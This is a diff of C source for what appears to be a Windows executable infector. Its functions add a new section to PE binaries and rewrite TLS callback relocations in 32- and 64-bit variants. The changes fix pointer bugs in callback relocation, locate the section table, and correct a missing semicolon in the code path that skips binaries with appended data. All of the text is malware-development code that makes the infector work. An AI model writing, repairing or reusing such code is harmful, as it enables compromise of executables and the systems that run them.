@@ -310,7 +310,7 @@ void create_tls_relocations(InfectorIAT *iat, CVector *module, IMAGE_SECTION_HEA
    {
       DWORD callback_rva = tls_ptr.tls64->AddressOfCallBacks - nt_headers->OptionalHeader.ImageBase;
       DWORD tls_callback_offset = callback_rva - new_section->VirtualAddress;
-      uintptr_t *callback_ptr = RECAST(uintptr_t *, CVECTOR_CAST(&new_section_data, uint8_t *)+tls_callback_offset);
+      uintptr_t *callback_ptr = RECAST(uintptr_t *, CVECTOR_CAST(new_section_data, uint8_t *)+tls_callback_offset);
 
       while (*callback_ptr != 0)
       {
@@ -323,7 +323,7 @@ void create_tls_relocations(InfectorIAT *iat, CVector *module, IMAGE_SECTION_HEA
    {
       DWORD callback_rva = tls_ptr.tls32->AddressOfCallBacks - nt_headers->OptionalHeader.ImageBase;
       DWORD tls_callback_offset = callback_rva - new_section->VirtualAddress;
-      uint32_t *callback_ptr = RECAST(uint32_t *, CVECTOR_CAST(&new_section_data, uint8_t *)+tls_callback_offset);
+      uint32_t *callback_ptr = RECAST(uint32_t *, CVECTOR_CAST(new_section_data, uint8_t *)+tls_callback_offset);
 
       while (*callback_ptr != 0)
       {
@@ -371,6 +371,9 @@ CVector create_64bit_tls_section(InfectorIAT *iat, CVector *module, IMAGE_SECTIO
 {
    uint8_t *byte_module = CVECTOR_CAST(module, uint8_t *);
    PIMAGE_NT_HEADERS64 nt_headers = RECAST(PIMAGE_NT_HEADERS64,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
+   size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
+   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew+nt_headers_size);
+   
    size_t new_section_size = 0;
 
    /* begin creating the new tls directory */
@@ -548,7 +551,7 @@ CVector infect_64bit(InfectorIAT *iat, CVector *module)
 
    if (new_section_offset < module->elements) /* there's appended data to this binary, do not tamper */
    {
-      puts("\t\tAppended data on binary, cowardly quitting.\n")
+      puts("\t\tAppended data on binary, cowardly quitting.\n");
       return result;
    }
 
